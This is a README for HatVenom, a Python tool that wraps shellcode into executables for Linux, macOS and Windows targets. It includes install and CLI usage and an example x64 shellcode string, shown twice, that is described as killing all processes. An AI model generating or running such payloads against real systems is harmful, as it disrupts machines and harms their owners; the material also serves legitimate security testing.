# HatVenom

[![Developer](https://img.shields.io/badge/developer-EntySec-blue.svg)](https://entysec.com)
[![Language](https://img.shields.io/badge/language-Python-blue.svg)](https://github.com/EntySec/HatVenom)
[![Forks](https://img.shields.io/github/forks/EntySec/HatVenom?style=flat&color=green)](https://github.com/EntySec/HatVenom/forks)
[![Stars](https://img.shields.io/github/stars/EntySec/HatVenom?style=flat&color=yellow)](https://github.com/EntySec/HatVenom/stargazers)
[![CodeFactor](https://www.codefactor.io/repository/github/EntySec/HatVenom/badge)](https://www.codefactor.io/repository/github/EntySec/HatVenom)

HatVenom is a powerful payload generation tool that provides support for all common platforms and architectures.

## Features

* Support for most common executable formats like `elf`, `macho`, `pe`, `dll`.
* Support for most common architectures like `x64`, `x86`, `aarch64`, `armle`, `mipsle`, `mipsbe`.
* Ability to modify shellcode and inject assembly (coming soon).

## Installation

```shell
pip3 install git+https://github.com/EntySec/HatVenom
```

## Supported targets

| Format    | **x86** | **x64** | **armle** | **armbe** | **aarch64** | **mipsle** | **mipsbe** | **mips64le** | **mips64be** |
|-----------|---------|---------|-----------|-----------|-------------|------------|------------|--------------|--------------|
| **elf**   | yes | yes | yes | no | yes | yes | yes | no | no |
| **macho** | no | yes | no | no | no | no | no | no | no |
| **dylib** | no | yes | no | no | no | no | no | no | no |
| **pe**    | yes | yes | no | no | no | no | no | no | no |
| **dll**   | yes | yes | no | no | no | no | no | no | no |

* **elf** - Unix Executable & Linkable Format.
* **macho** - macOS / Apple iOS Mach-O executable format.
* **dylib** - macOS / Apple iOS dynamic library format.
* **pe** - Windows Portable Executable format.
* **dll** - Windows Dynamic Link Library format.

## Basic functions

There are all HatVenom basic functions that can be used to generate payload, covert data, assemble code or inject shellcode.

* `generate(file_format, arch, shellcode)` - Generates payload for specified target and with specified shellcode.
* `generate_to(file_format, arch, shellcode, filename='a.out')` - Generates payload for specified target and with specified shellcode and saves it to the specified file.

## Generating payload

It's very easy to generate payload for various targets in HatVenom. Let's generate a simple payload that kills all processes for Linux and save it to `a.out`.

### Examples

```python
from hatvenom import HatVenom

shellcode = (
    "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
)

hatvenom = HatVenom()
hatvenom.generate_to('elf', 'x64', shellcode)
```

## HatVenom CLI

HatVenom also has its own command line interface that can be invoked by executing `hatvenom` command:

```
usage: hatvenom [-h] [-f FORMAT] [-a ARCH] [-s SHELLCODE] [-o OUTPUT]

HatVenom is a powerful payload generation and shellcode
injection tool that provides support for common platforms and architectures.

optional arguments:
  -h, --help            show this help message and exit
  -f FORMAT, --format FORMAT
                        Platform to generate for.
  -a ARCH, --arch ARCH  Architecture to generate for.
  -s SHELLCODE, --shellcode SHELLCODE
                        Shellcode to inject.
  -o OUTPUT, --output OUTPUT
                        File to output generated payload.
```

### Examples

Let's generate a simple payload that kills all processes for Linux and save it to `a.out`.

```shell
hatvenom --format elf --arch x64 --shellcode "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
```
